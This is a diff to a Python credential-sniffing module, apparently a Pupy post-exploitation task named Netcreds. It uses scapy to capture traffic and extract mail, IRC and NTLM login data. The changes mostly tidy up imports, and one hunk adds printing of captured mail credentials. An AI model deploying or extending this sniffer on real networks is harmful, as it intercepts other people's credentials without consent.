@@ -4,34 +4,19 @@ import platform
 windows = platform.system() == "Windows"
 linux   = platform.system() == "Linux"
 
-if not windows:
-    from os import geteuid, devnull
+from scapy.all import (
+    IPv6, Raw, IP, UDP, TCP, Ether,
+    SNMP, conf, sniff, pcapname
+)
 
-import scapy.arch
+conf.verb = 0
 
-from scapy.packet import Raw
-from scapy.layers.inet import IP,UDP,TCP
-from scapy.layers.l2 import Ether
-from scapy.layers.snmp import SNMP
-from scapy.config import conf
-from scapy.sendrecv import sniff
-
-# from scapy.all import *
-conf.verb=0
 from sys import exit
 import binascii
 import struct
-import argparse
-import signal
 import base64
 from urllib import unquote
-from subprocess import Popen, PIPE
 from collections import OrderedDict
-from BaseHTTPServer import BaseHTTPRequestHandler
-from StringIO import StringIO
-from urllib import unquote
-import binascii
-import threading
 
 import copy
 import re
@@ -104,7 +89,7 @@ class Netcreds(pupy.Task):
         # Find the active interface
         if self.interface:
             if windows:
-                conf.iface = scapy.arch.pcapname(self.interface)
+                conf.iface = pcapname(self.interface)
             else:
                 conf.iface = self.interface
 
@@ -239,7 +224,9 @@ class Netcreds(pupy.Task):
                     return
 
                 # Mail
-                mail_creds_found = self.mail_logins(full_load, src_ip_port, dst_ip_port, ack, seq)
+                mail_creds = self.mail_logins(full_load, src_ip_port, dst_ip_port, ack, seq)
+                if mail_creds != None:
+                    self.printer(src_ip_port, dst_ip_port, mail_creds)
 
                 # IRC
                 irc_creds = self.irc_logins(full_load, pkt)
@@ -453,7 +440,7 @@ class Netcreds(pupy.Task):
             decoded = decoded.replace('\x00', ' ')
         except TypeError:
             decoded = None
-        except UnicodeDecodeError as e:
+        except UnicodeDecodeError:
             decoded = None
 
         if decoded != None:
@@ -887,7 +874,6 @@ class Netcreds(pupy.Task):
         '''
         global challenge_acks
 
-        Signature = msg2[0:8]
         try:
             msg_type = struct.unpack("<I",msg2[8:12])[0]
         except Exception:
